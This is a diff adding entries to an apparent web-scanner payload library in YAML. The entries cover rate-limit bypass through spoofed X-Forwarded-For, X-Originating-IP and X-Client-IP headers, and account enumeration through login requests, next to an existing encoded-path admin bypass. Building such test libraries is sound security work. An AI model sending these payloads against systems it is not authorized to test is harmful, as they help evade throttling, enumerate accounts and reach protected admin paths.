@@ -415,3 +415,52 @@ payloads:
     payload: "/%2e/admin"
     notes: "URL-encoded dot in path. Proxy sees /%2e/admin (no match for /admin prefix), backend resolves to /./admin = /admin."
     tags: [path, url_encoded, dot, bypass]
+
+  # ============================================================
+  # Rate limit bypass — header rotation
+  # ============================================================
+  - technique: rate_limit_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Forwarded-For: RANDOM_IP"
+    placeholders: [RANDOM_IP]
+    notes: "Rate limit bypass via X-Forwarded-For rotation. Each request uses a different IP to reset rate counters."
+    tags: [rate_limit, xff, rotation]
+
+  - technique: rate_limit_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Originating-IP: RANDOM_IP"
+    placeholders: [RANDOM_IP]
+    notes: "Rate limit bypass via X-Originating-IP header."
+    tags: [rate_limit, x_originating_ip, rotation]
+
+  - technique: rate_limit_bypass
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Client-IP: RANDOM_IP"
+    placeholders: [RANDOM_IP]
+    notes: "Rate limit bypass via X-Client-IP header."
+    tags: [rate_limit, x_client_ip, rotation]
+
+  # ============================================================
+  # Account enumeration
+  # ============================================================
+  - technique: account_enumeration
+    injection_surface: form_body
+    evidence_type: response_diff
+    risk: 2
+    payload: "username=admin&password=wrong"
+    notes: "Account enumeration — compare response (timing, status, body) between existing and non-existing usernames."
+    tags: [account_enum, username, admin]
+
+  - technique: account_enumeration
+    injection_surface: form_body
+    evidence_type: response_diff
+    risk: 2
+    payload: "username=nonexistent_user_12345&password=wrong"
+    notes: "Account enumeration — non-existent username baseline. Compare with known-valid username response."
+    tags: [account_enum, username, nonexistent]
